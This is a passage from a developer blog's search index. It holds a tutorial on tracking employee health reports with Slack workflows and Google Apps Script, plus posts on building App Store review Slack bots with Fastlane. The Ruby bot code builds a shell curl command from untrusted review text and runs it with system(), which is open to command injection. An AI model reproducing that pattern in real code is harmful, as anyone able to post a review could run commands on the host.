list page and click \"Publish Change\" in the upper right corner to publish the changes.Now let's test the workflow shortcut again to see if the timestamp is written correctly.![](/assets/d61062833c1a/1*GyJ-55XxVEcZ6Cb1Q_H-WQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NDYiIGhlaWdodD0iMTYwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }Success!#### Adding a Response to Slack Workflow FormJust like with Google Forms, you can also add a response to the Slack workflow form.On the editing step page, we can add another step by clicking \"Add Step.\"![](/assets/d61062833c1a/1*16JMg7a_YzUHnnY6JtBrGw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMTM2IiBoZWlnaHQ9IjkyMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }This time select \"Send a message\"![](/assets/d61062833c1a/1*2CJuPDtuaTM9P5wIKwPspQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMTM2IiBoZWlnaHQ9IjkyMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }In \"Send this message to,\" select \"Person who submitted form\"![](/assets/d61062833c1a/1*xKh_l7A-z31B6rQPboFTAA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMTM2IiBoZWlnaHQ9IjkyMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }For the message content, sequentially enter the question title, then click \"Insert a variable\" to select \"Response to Question XXX,\" and you can also insert \"Timestamp\" at the end. Click \"Save\" to save the step, then click \"Publish Changes\"!&gt; _You can also use \"Send a message\" to send the response results to a specific Channel or DM._![](/assets/d61062833c1a/1*gfTjTnaNmu-aPj0MuF6M_Q.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDkxIiBoZWlnaHQ9Ijk3OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Success!The setup for the Slack workflow form is mostly complete; feel free to mix and match other functionalities.### Google Sheet with App Script!Next, we need to write an App Script to handle the submitted data.![](/assets/d61062833c1a/1*04KBQF7e4lCjQm5XeHgVrA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1NjIiIGhlaWdodD0iNDkwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }First, in the Google Sheet toolbar, select \"Tools\" -&gt; \"Script editor\"![](/assets/d61062833c1a/1*wlg8D_1DHONj__M1dSBCxw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3OTEiIGhlaWdodD0iMjcyIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }You can click the upper left corner to give the project a name.Now we can start writing the App Script! App Script is designed based on JavaScript, so you can directly use JavaScript code along with Google Sheet's library.#### Distributing Responses Data to Each Date's Sheet According to Submission Date![](/assets/d61062833c1a/1*T5ExI_5aSf7QY5Zj_gJ3eg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMTI4IiBoZWlnaHQ9Ijc0NiI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }```javascriptfunction formatData() { var bufferSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Responses') // Name of the sheet storing responses var rows = bufferSheet.getDataRange().getValues(); var fields = []; var startDeleteIndex = -1; var deleteLength = 0; for(index in rows) { if (index == 0) { fields = rows[index]; continue; } var sheetName = rows[index][0].toLocaleDateString(\"en-US\"); // Convert Date to String using US date format MM/DD/YYYY var sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(sheetName); // Get MM/DD/YYYY Sheet if (sheet == null) { // If not, create a new one sheet = SpreadsheetApp.getActiveSpreadsheet().insertSheet(sheetName, bufferSheet.getIndex()); sheet.appendRow(fields); } sheet.appendRow(rows[index]); // Add data to the date Sheet if (startDeleteIndex == -1) { startDeleteIndex = +index + 1; } deleteLength += 1; } if (deleteLength &gt; 0) { bufferSheet.deleteRows(startDeleteIndex, deleteLength); // After moving to the specified Sheet, remove data from Responses }}Paste the above code into the Code section and press “control” + “s” to save.Next, we need to add a trigger button in the Sheet ( it can only be triggered manually, it cannot be automatically triggered when data is written ) First, create a new Sheet named “Unfilled List” In the upper toolbar, select “Insert” -&gt; “Drawing”Using this interface, draw a button.After clicking “Save and Close,” you can adjust and move the button; click the upper right corner “…” and select “Assign script”Enter the function name “formatData.”You can click the added button to test its functionalityIf “Authorization Required” appears, click “Continue” to complete the verificationDuring the authentication process, “Google hasn’t verified this app” will appear, which is normal since the App Script we wrote has not been verified by Google. However, this is fine as it is for personal use.You can click “Advanced” in the lower left corner -&gt; “Go to Health Report (Responses) (unsafe)”Click “Allow” While the App Script is running, it will display “Running Script,” please do not click again to avoid duplicate execution. You can only execute it again after it shows successful execution.Success! The submitted data has been grouped by date.Comparing the Current Date’s Sheet with the Employee List to Generate Unfilled List Sheet DataLet’s add another piece of code:// Compare with Employee List Sheet &amp; Today's Submission Sheet to generate Unfilled Listfunction generateUnfilledList() { var listSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Employee List') // Name of Employee List Sheet var unfilledListSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Unfilled List') // Name of Unfilled List Sheet var today = new Date(); var todayName = today.toLocaleDateString(\"en-US\"); var todayListSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(todayName) // Get today's MM/DD/YYYY Sheet if (todayListSheet == null) { SpreadsheetApp.getUi().alert('Cannot find the Sheet for '+todayName+' or please execute \"Organize Submission Data\" first'); return; } var todayEmails = todayListSheet.getDataRange().getValues().map( x =&gt; x[1] ) // Get the list of Email Address data from today's Sheet (1 = Column B) // index starts from 0, so 1 = Column B // output: Email Address,zhgchgli@gmail.com,alan@gamil.com,b@gmail.com... todayEmails.shift() // Remove the first data, the first one is the column name \"Email Address,\" which is meaningless // output: zhgchgli@gmail.com,alan@gamil.com,b@gmail.com... unfilledListSheet.clear() // Clear the Unfilled List... preparing to re-enter data unfilledListSheet.appendRow([todayName+\" Unfilled List\"]) // The first row displays the Sheet title var rows = listSheet.getDataRange().getValues(); // Read Employee List Sheet for(index in rows) { if (index == 0) { // The first row is the header row, store it so that subsequent data generation can also include the header unfilledListSheet.appendRow(rows[index]); continue; } if (todayEmails.includes(rows[index][3])) { // If this employee's Email is in today's Sheet Email Address, it means they have filled it out, continue to skip... continue; } unfilledListSheet.appendRow(rows[index]); // Write a row of data to the Unfilled List Sheet }}After saving, follow the previous method to add the code, then add another button and assign the script — “generateUnfilledList.”Once completed, you can click to test:The Unfilled List has been successfully generated! If no content appears, please ensure: The Employee List has been filled out, or you can enter test data first You must complete the “Organize Submission Data” action firstReading the Unfilled List Sheet to Compose a Message and Send it to a Designated Slack ChannelFirst, we need to add the Incoming WebHooks App to the Slack Channel, which we will use to send messages. In Slack, click “Apps” in the lower left corner -&gt; “Add apps” Search for “incoming” in the search box on the right Click “Incoming WebHooks” -&gt; “Add”Select the Channel where you want to send the unfilled messages.Note the “Webhook URL” at the topScroll down to set the display name and profile picture for the Bot when sending messages; remember to click “Save Settings” after making changes.Return to our Google Sheet ScriptAdd another piece of code:function postSlack() { var ui = SpreadsheetApp.getUi(); var result = ui.alert( 'Are you sure you want to send the message?', 'Send unfilled reminder message to Slack Channel', ui.ButtonSet.YES_NO); // To avoid accidental clicks, first ask for confirmation if (result == ui.Button.YES) { var unfilledListSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Unfilled List') // Name of Unfilled List Sheet var rows = unfilledListSheet.getDataRange().getValues(); var persons = []; for(index in rows) { if (index == 0 || index == 1) { // Skip the header and column title rows continue; } var person = (rows[index][4] == \"\") ? (rows[index][2]) : (\"&lt;@\"+rows[index][4]+\"&gt;\"); // Mark the target, if there is a slack uid, use it first; if not, just display the nickname; 2 = Column B / 4 = Column E if (person == \"\") { // If neither is present, consider it as abnormal data, ignore it continue; } persons.push(\"• \"+person+'\\n') // Store the target in the array } if (persons.length &lt;= 0) { // If there are no targets to be marked, it means everyone has filled it out, cancel the message sending return; } var preText = \"*[Health Report Announcement:loudspeaker:]*\\nThe company cares about everyone's health, please remind the following teammates to fill out their health status report daily, thank you:wink:\\n\\nToday's unfilled health status report list\\n\\n\" // Message opening content... var postText = \"\\n\\nFilling out the health status report allows the company to understand the physical condition of teammates, please ensure everyone fills it out daily &gt;&lt; Thank you all:woman-bowing::skin-tone-2:\" // Message closing content... var payload = { \"text\": preText+persons.join('')+postText, \"attachments\": [{ \"fallback\": \"Here you can place the Google Form fill link\", \"actions\": [ { \"name\": \"form_link\", \"text\": \"Go to Health Status Report\", \"type\": \"button\", \"style\": \"primary\", \"url\": \"Here you can place the Google Form fill link\" } ], \"footer\": \":rocket:Tip: Click the input box below the \" :zap:️Lightning\" -&gt; \"Shortcut Name\" to fill it out directly.\" } ] }; var res = UrlFetchApp.fetch('Enter your Slack incoming app Webhook URL here',{ method : 'post', contentType : 'application/json', payload : JSON.stringify(payload) }) }}After saving, follow the previous method to add the code, then add another button and assign the script — “postSlack.”Once completed, you can click to test:Success!!! (The display of @U123456 not successfully tagging the person is because the ID was randomly entered)At this point, the main functionalities are complete! Note Please note that the official recommendation is to use the new Slack APP API’s chat.postMessage to send messages. The convenient method of Incoming Webhook will be deprecated in the future. This was done for convenience and will need to be adjusted to the new method along with the next chapter “Import Employee List.”Importing Employee ListHere we need to create a Slack APP. Go to https://api.slack.com/apps Click “Create New App” in the upper right corner Choose “ From scratch “ Enter “ App Name “ and the Workspace you want to add it to After successful creation, select “OAuth &amp; Permissions” from the left menu for settings Scroll down to the Scopes sectionAdd the following items by clicking “Add an OAuth Scope”: channels:read users:read users:read.email If you want to send messages using the APP, you can add chat.postMessage Go back to the top and click “Install to workspace” or “Reinstall to workspace” *If Scopes are added, you need to reinstall it again. After installation, copy the Bot User OAuth Token Use the web version of Slack to open the Channel you want to import the list into``` Get the URL from the browser:https://app.slack.com/client/TXXXX/CXXXXWhere `CXXXX` is the Channel ID for this channel, make a note of this message.10\\.Return to our Google Sheet ScriptAdd another piece of code:```javascriptfunction loadEmployeeList() { var formData = { 'token': 'Bot User OAuth Token', 'channel': 'Channel ID', 'limit': 500 }; var options = { 'method' : 'post', 'payload' : formData }; var response = UrlFetchApp.fetch('https://slack.com/api/conversations.members', options); var data = JSON.parse(response.getContentText()); for (index in data[\"members\"]) { var uid = data[\"members\"][index]; var formData = { 'token': 'Bot User OAuth Token', 'user': uid }; var options = { 'method' : 'post', 'payload' : formData }; var response = UrlFetchApp.fetch('https://slack.com/api/users.info', options); var user = JSON.parse(response.getContentText()); var email = user[\"user\"][\"profile\"][\"email\"]; var real_name = user[\"user\"][\"profile\"][\"real_name_normalized\"]; var title = user[\"user\"][\"profile\"][\"title\"]; var row = [title, real_name, real_name, email, uid]; // Fill in according to Column var listSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Employee List'); // Name of the Employee List Sheet listSheet.appendRow(row); }}But this time we don’t need to add a button, as the import only needs to be done the first time; just save the file and run it directly.First, press “control” + “s” to save, change the dropdown menu above to select “loadEmployeeList”, and click “Run” to start importing the list into the Employee List Sheet.Manually Add New Employee DataIf new employees join later, you can directly add a row in the Employee List Sheet and fill in the information. The Slack UID can be found directly on Slack:Click on the person whose UID you want to view, then click “View full profile”Click “More” and select “Copy member ID” to get the UID. UXXXXXDONE!All the above steps have been completed, and you can start automating the tracking of employee health status.The completed file is available below; you can create a copy from the following Google Sheet to modify and use:Additional Notes If you want to use Scheduled date &amp; time to send form messages regularly, note that in this case, the form can only be filled out once, so it is not suitable for use here… (at least in the current version). Therefore, scheduled reminder messages still can only use plain text + Google Form links. Currently, there is no way to link to a Shortcut to open the Form Google Sheet App Script to prevent duplicate execution:If you want to prevent accidentally pressing again during execution, which would cause duplicate execution, you can add the following at the beginning of the function:if (PropertiesService.getScriptProperties().getProperty('FUNCTIONNAME') == 'true') { SpreadsheetApp.getUi().alert('Busy... please try again later'); return;}PropertiesService.getScriptProperties().setProperty('FUNCTIONNAME', 'true');At the end of the function, add:PropertiesService.getScriptProperties().setProperty('FUNCTIONNAME', 'true');Replace FUNCTIONNAME with the target function name.Use a global variable to control execution.Applications Related to iOS DevelopmentThis can be used to integrate CI/CD, wrapping the originally clunky command operations in a GUI, for example, in conjunction with the Slack Bitrise APP, using Slack Workflow forms to trigger Build commands:After submission, it will send commands to a private channel with the Bitrise APP, e.g.:bitrise workflow:app_store|branch:develop|ENV[version]:4.32.0This will trigger Bitrise to execute the CI/CD Flow.Further Reading Using Python + Google Cloud Platform + Line Bot to Automate Routine Tasks Using Google Apps Script to Forward Gmail Messages to Slack Crashlytics + Big Query to Create a More Immediate and Convenient Crash Tracking Tool Crashlytics + Google Analytics to Automatically Query App Crash-Free Users RateIf you have any questions or suggestions, feel free to contact me.If you have any automation-related optimization needs, feel free to hire me, thank you.```This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 2,436 Total Views Last Statistics Date: 2025-08-15 | 2,247 Views on Medium." }, { "title": "ZReviewsBot — Slack App Review 通知機器人", "url": "/posts/zrealm-dev/zreviewsbot-slack-app-review-%E9%80%9A%E7%9F%A5%E6%A9%9F%E5%99%A8%E4%BA%BA-33f6aabb744f/", "categories": "ZRealm Dev.", "tags": "ios-app-development, slack, slackbot, app-review, ruby", "date": "2021-05-05 21:51:19 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.ZReviewsBot — Slack App Review 通知機器人免費開源的 iOS &amp; Android APP 最新評價追蹤 Slack BotTL;DR [2022/08/10] Update:現已改用全新的...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.ZReviewsBot — Slack App Review 通知機器人免費開源的 iOS &amp; Android APP 最新評價追蹤 Slack BotTL;DR [2022/08/10] Update:現已改用全新的 App Store Connect API 重新設計 App Reviews Bot，並更名重新推出「 ZReviewTender — 免費開源的 App Reviews 監控機器人 」。====ZhgChgLi / ZReviewsBotZReviewsBotZReviewsBot 為免費、開源專案，幫助您的 App 團隊自動追蹤 App Store (iOS) 及 Google Play (Android) 平台上 App 的最新評價，並發送到指定 Slack Channel 方便您即時了解當前 App 狀況。 ✅ 使用更新、更可靠的 API Endpoint 追蹤 iOS App 評價 ( 技術細節 ) ✅ 支援雙平台評價追蹤 iOS &amp; Android ✅ 支援關鍵字通知略過功能 (防洗版廣告騷擾) ✅ 客製化設定，隨心所欲 ✅ 支援使用 Github Action 部署 Schedule 自動機器人[2022/07/20 Update]App Store Connect API 現已支援 讀取和管理 Customer Reviews ，此機器人將於後續更新實作，取代掉使用 Fastlane — Spaceship 去後台拿評價的方式。起源繼上一篇「 AppStore APP’s Reviews Slack Bot 那些事 」研究並完成了新的 iOS 評價撈取工具，想了想好像蠻適合當 Side Project Open Source 出來給有相同問題的朋友使用。Flow延伸閱讀 [生產力工具] 拋棄 Chrome 投入 Sidekick 瀏覽器的懷抱有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 352 Total Views Last Statistics Date: 2025-08-15 | 293 Views on Medium." }, { "title": "ZReviewsBot — Slack App Review Notification Bot", "url": "/posts/zrealm-dev/en/zreviewsbot-slack-app-review-notification-bot-33f6aabb744f/", "categories": "ZRealm Dev.", "tags": "ios-app-development, slack, slackbot, app-review, ruby", "date": "2021-05-05 21:51:19 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版ZReviewsBot — Slack App Review Notification BotA free and open-source Slack bot for ...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版ZReviewsBot — Slack App Review Notification BotA free and open-source Slack bot for tracking the latest reviews of iOS and Android apps.TL;DR [2022/08/10] Update:The App Reviews Bot has been redesigned using the new App Store Connect API and has been rebranded as ZReviewTender — a free and open-source App Reviews monitoring bot.====ZhgChgLi / ZReviewsBotZReviewsBotZReviewsBot is a free and open-source project that helps your app team automatically track the latest reviews of your app on the App Store (iOS) and Google Play (Android) platforms, sending updates to a designated Slack channel so you can stay informed about your app’s current status. ✅ Uses updated and more reliable API endpoints to track iOS app reviews ( Technical Details ) ✅ Supports dual-platform review tracking for iOS &amp; Android ✅ Includes keyword notification filtering to avoid spam ✅ Customizable settings to suit your needs ✅ Supports deployment of scheduled bots using GitHub Actions[2022/07/20 Update]The App Store Connect API now supports reading and managing Customer Reviews, and this bot will implement this in future updates, replacing the previous method of using Fastlane — Spaceship to fetch reviews from the backend.OriginFollowing the previous article “AppStore APP’s Reviews Slack Bot Insights,” I developed a new tool for fetching iOS reviews and thought it would be a great idea to release it as an open-source side project for others facing similar challenges.FlowFurther Reading [Productivity Tools] Ditching Chrome for the Sidekick BrowserIf you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 352 Total Views Last Statistics Date: 2025-08-15 | 293 Views on Medium." }, { "title": "AppStore APP’s Reviews Bot 那些事", "url": "/posts/zrealm-dev/appstore-app-s-reviews-bot-%E9%82%A3%E4%BA%9B%E4%BA%8B-cb0c68c33994/", "categories": "ZRealm Dev.", "tags": "slackbot, ios-app-development, ruby, fastlane, automator", "date": "2021-04-21 23:16:31 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.AppStore APP’s Reviews Slack Bot 那些事使用 Ruby+Fastlane-SpaceShip 動手打造 APP 評價追蹤通知 Slack 機器人Photo by Austin Distel吃米不...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.AppStore APP’s Reviews Slack Bot 那些事使用 Ruby+Fastlane-SpaceShip 動手打造 APP 評價追蹤通知 Slack 機器人Photo by Austin Distel吃米不知米價AppReviewBot 為例最近才知道 Slack 中轉發 APP 最新評價訊息的機器人是要付費的，我一直以為這功能是免費的；費用從 $5 到 $200 美金/月都有，因為各平台都不會只做「App Review Bot」的功能，其他還有數據統計、紀錄、統一後台、與競品比較…等等，費用也是照各平台能提供的服務為標準；Review Bot 只是他們的一環，但我就只想用這個功能其他不需要，如果是這樣付費蠻浪費的。問題本來是用免費開源的工具 TradeMe/ReviewMe 來做 Slack 通知，但這個工具已年久失修，時不時 Slack 會爆噴一些舊的評價，看得讓人心驚膽顫（很多 Bug 都早已修復，害我們以為又有問題！），原因不明。所以考慮找其他工具、方法取代。TL;DR [2022/08/10] Update:現已改用全新的 App Store Connect API 重新設計 App Reviews Bot，並更名重新推出「 ZReviewTender — 免費開源的 App Reviews 監控機器人 」。====2022/07/20 UpdateApp Store Connect API 現已支援 讀取和管理 Customer Reviews ，App Store Connect API 原生已支援存取 App 評價， 不需要再使用 Fastlane — Spaceship 去後台拿評價。原理探究有了動機之後，再來研究下達成目標的原理。官方 API ❌蘋果有提供 App Store Connect API ，但沒提供撈取評價功能。[2022/07/20 更新]： App Store Connect API 現已支援 讀取和管理 Customer ReviewsPublic URL API (RSS) ⚠️蘋果有提供公開的 APP 評價 RSS 訂閱網址 ，而且除了 rss xml 還提供 json 格式。https://itunes.apple.com/國家碼/rss/customerreviews/id=APP_ID/page=1/sortBy=mostRecent/json 國家碼：可參考 這份文件 。 APP_ID：前往 App 網頁版，會得到網址：https://apps.apple.com/tw/app/APP名稱/id 12345678 ，id 後面的數字及為 App ID（純數字）。 page：可請求 1~10 頁，超過無法取得。 sortBy： mostRecent/json 請求最新的＆ json 格式，也可改為 mostRecent/xml 則為 xml 格式。評價資料回傳如下：rss.json:{ \"author\": { \"uri\": { \"label\": \"https://itunes.apple.com/tw/reviews/id123456789\" }, \"name\": { \"label\": \"test\" }, \"label\": \"\" }, \"im:version\": { \"label\": \"4.27.1\" }, \"im:rating\": { \"label\": \"5\" }, \"id\": { \"label\": \"123456789\" }, \"title\": { \"label\": \"很棒的存在！\" }, \"content\": { \"label\": \"人生值得了～\", \"attributes\": { \"type\": \"text\" } }, \"link\": { \"attributes\": { \"rel\": \"related\", \"href\": \"https://itunes.apple.com/tw/review?id=123456789&amp;type=Purple%20Software\" } }, \"im:voteSum\": { \"label\": \"0\" }, \"im:contentType\": { \"attributes\": { \"term\": \"Application\", \"label\": \"應用程式\" } }, \"im:voteCount\": { \"label\": \"0\" }}優點： 公開、不需身份驗證步驟即可存取 簡單好用缺點： 此 RSS API 很老舊都沒更新 回傳評價的資訊太少（沒留言時間、已編輯過評價？、已回覆？） 遇到資料錯亂問題（後面幾頁偶爾會突然噴舊資料） 最多存取 10 頁 關於我們遇到的最大問題是 3；但這部分不確定是我們用的 Bot 工具 問題，還是這個 RSS URL 資料有問題。Private URL API ✅這個方法說來有點旁門左道，也是我突發奇想發現的；但在後續參考了其他 Review Bot 做法之後發現很多網站也都是這樣用，應該沒什麼問題而且我 4~5 年前就看過有工具這樣做了，只是當時沒深入研究。優點： 同蘋果後台資料 資料完整且最新 可做更多細節篩選 具備深度整合的 APP 工具也是用這個方法（AppRadar/AppReviewBot…）缺點： 非官方公布方法（旁門左道） 因蘋果實行全面兩步驟登入，所以登入 session 需要定期更新。第一步 — 嗅探 App Store Connect 後台評論區塊 Load 資料的 API：得到蘋果後台是透過打：https://appstoreconnect.apple.com/WebObjects/iTunesConnect.woa/ra/apps/APP_ID/platforms/ios/reviews?index=0&amp;sort=REVIEW_SORT_ORDER_MOST_RECENT這個 endpoint 取得評價列表：index = 分頁 offset，一次最多顯示 100 筆。評價資料回傳如下：private.json:{ \"value\": { \"id\": 123456789, \"rating\": 5, \"title\": \"很棒的存在！\", \"review\": \"人生值得了～\", \"created\": null, \"nickname\": \"test\", \"storeFront\": \"TW\", \"appVersionString\": \"4.27.1\", \"lastModified\": 1618836654000, \"helpfulViews\": 0, \"totalViews\": 0, \"edited\": false, \"developerResponse\": null }, \"isEditable\": true, \"isRequired\": false, \"errorKeys\": null}另外經過測試後發現，只需要在帶上 cookie: myacinfo=&lt;Token&gt; 即可偽造請求得到資料：API 有了、要求的 header 知道了，再來就要想辦法自動化取得後台這個 cookie 資訊。第二步 —萬能 Fastlane因蘋果現在實行全 Two-Step Verification，所以對於登入驗證自動化變得更加煩瑣，幸好與蘋果鬥智鬥勇的 Fastlane ，除了正規的 App Store Connect API、iTMSTransporter、網頁認證(包含兩步驟認證)全都有實作；我們可以直接使用 Fastlane 的指令：fastlane spaceauth -u &lt;App Store Connect 帳號(Email)&gt;此指令會完成網頁登入驗證(包含兩步驟認證)，然後將 cookie 存入 FASTLANE_SESSION 檔案之中。會得到類似如下字串：!ruby/object:HTTP::Cookiename: myacinfo value: &lt;token&gt; domain: apple.com for_domain: true path: \"/\" secure: true httponly: true expires: max_age: created_at: 2021-04-21 20:42:36.818821000 +08:00 accessed_at: 2021-04-21 22:02:45.923016000 +08:00!ruby/object:HTTP::Cookiename: &lt;hash&gt; value: &lt;token&gt;domain: idmsa.apple.com for_domain: true path: \"/\"secure: true httponly: true expires: max_age: 2592000created_at: 2021-04-19 23:21:05.851853000 +08:00accessed_at: 2021-04-21 20:42:35.735921000 +08:00將 myacinfo = value 帶入就能取得評價列表。第三步 — SpaceShip本來以為 Fastlane 只能幫我們到這了，再來要自己串起從 Fastlane 拿到 cookie 然後打 api 的 flow；沒想到經過一番探索發現 Fastlane 關於驗證這塊的模組 SpaceShip 還有更多強大的功能！SpaceShipSpaceShip 裡面已經幫我們打包好撈評價列表的方法 Class: Spaceship::TunesClient::get_reviews 了！app = Spaceship::Tunes::login(appstore_account, appstore_password)reviews = app.get_reviews(app_id, platform, storefront, versionId = '')*storefront = 地區第四步 — 組裝Fastlane、Spaceship 都是由 ruby 撰寫，所以我們也要用 ruby 來製作這個 Bot 小工具。我們可以建立一個 reviewBot.rb 檔案，編譯執行時只需在 Terminal 輸入：ruby reviewBot.rb即可。 ( *更多 ruby 環境問題可參考文末提示)首先 ，因原本的 get_reviews 口的參數不符合我們需求；我想要的是全地區、全版本的評價資料、不需要篩選、支援分頁：extension.rb:# Extension Spaceship-&gt;TunesClientmodule Spaceship class TunesClient &lt; Spaceship::Client def get_recent_reviews(app_id, platform, index) r = request(:get, \"ra/apps/#{app_id}/platforms/#{platform}/reviews?index=#{index}&amp;sort=REVIEW_SORT_ORDER_MOST_RECENT\") parse_response(r, 'data')['reviews'] end endend所以我們自己在 TunesClient 中擴充一個方法，裡面參數只帶 app_id、platform = ios ( 全小寫 )、index = 分頁 offset。再來組裝登入驗證、撈評價列表：get_recent_reviews.rb:index = 0breakWhile = truewhile breakWhile app = Spaceship::Tunes::login(APPStoreConnect 帳號(Email), APPStoreConnect 密碼) reviews = app.get_recent_reviews($app_id, $platform, index) if reviews.length() &lt;= 0 breakWhile = false break end reviews.each { |review| index += 1 puts review[\"value\"] }end使用 while 遍歷所有分頁，當跑到無內容時終止。再來要加上紀錄上次最新一筆的時間，只通知沒通知過的最新訊息：lastModified.rb:lastModified = 0if File.exists?(\".lastModified\") lastModifiedFile = File.open(\".lastModified\") lastModified = lastModifiedFile.read.to_iendnewLastModified = lastModifiedisFirst = truemessages = []index = 0breakWhile = truewhile breakWhile app = Spaceship::Tunes::login(APPStoreConnect 帳號(Email), APPStoreConnect 密碼) reviews = app.get_recent_reviews($app_id, $platform, index) if reviews.length() &lt;= 0 breakWhile = false break end reviews.each { |review| index += 1 if isFirst isFirst = false newLastModified = review[\"value\"][\"lastModified\"] end if review[\"value\"][\"lastModified\"] &gt; lastModified &amp;&amp; lastModified != 0 # 第一次使用不發通知 messages.append(review[\"value\"]) else breakWhile = false break end }endmessages.sort! { |a, b| a[\"lastModified\"] &lt;=&gt; b[\"lastModified\"] }messages.each { |message| notify_slack(message)}File.write(\".lastModified\", newLastModified, mode: \"w+\")單純用一個 .lastModified 紀錄上一次執行時拿到的時間。*第一次使用不發通知，否則會一次狂噴最後一步，組合推播訊息 &amp; 發到 Slack：slack.rb:# Slack Botdef notify_slack(review) rating = review[\"rating\"].to_i color = rating &gt;= 4 ? \"good\" : (rating &gt;= 2 ? \"warning\" : \"danger\") like = review[\"helpfulViews\"].to_i &gt; 0 ? \" - #{review[\"helpfulViews\"]} :thumbsup:\" : \"\" date = review[\"edited\"] == false ? \"Created at: #{Time.at(review[\"lastModified\"].to_i / 1000).to_datetime}\" : \"Updated at: #{Time.at(review[\"lastModified\"].to_i / 1000).to_datetime}\" isResponse = \"\" if review[\"developerResponse\"] != nil &amp;&amp; review[\"developerResponse\"]['lastModified'] &lt; review[\"lastModified\"] isResponse = \" (回覆已過時)\" end edited = review[\"edited\"] == false ? \"\" : \":memo: 使用者更新評論#{isResponse}：\" stars = \"★\" * rating + \"☆\" * (5 - rating) attachments = { :pretext =&gt; edited, :color =&gt; color, :fallback =&gt; \"#{review[\"title\"]} - #{stars}#{like}\", :title =&gt; \"#{review[\"title\"]} - #{stars}#{like}\", :text =&gt; review[\"review\"], :author_name =&gt; review[\"nickname\"], :footer =&gt; \"iOS - v#{review[\"appVersionString\"]} - #{review[\"storeFront\"]} - #{date} - &lt;https://appstoreconnect.apple.com/apps/APP_ID/appstore/activity/ios/ratingsResponses|Go To App Store&gt;\" } payload = { :attachments =&gt; [attachments], :icon_emoji =&gt; \":storm_trooper:\", :username =&gt; \"ZhgChgLi iOS Review Bot\" }.to_json cmd = \"curl -X POST --data-urlencode 'payload=#{payload}' SLACK_WEB_HOOK_URL\" system(cmd, :err =&gt; File::NULL) puts \"#{review[\"id\"]} send Notify Success!\" endSLACK_WEB_HOOK_URL = Incoming WebHook URL最終結果appreviewbot.rb:require \"Spaceship\"require 'json'require 'date'# Config$slack_web_hook = \"目標通知的 web hook url\"$slack_debug_web_hook = \"機器人有錯誤時的通知 web hook url\"$appstore_account = \"APPStoreConnect 帳號(Email)\"$appstore_password = \"APPStoreConnect 密碼\"$app_id = \"APP_ID\"$platform = \"ios\"# Extension Spaceship-&gt;TunesClientmodule Spaceship class TunesClient &lt; Spaceship::Client def get_recent_reviews(app_id, platform, index) r = request(:get, \"ra/apps/#{app_id}/platforms/#{platform}/reviews?index=#{index}&amp;sort=REVIEW_SORT_ORDER_MOST_RECENT\") parse_response(r, 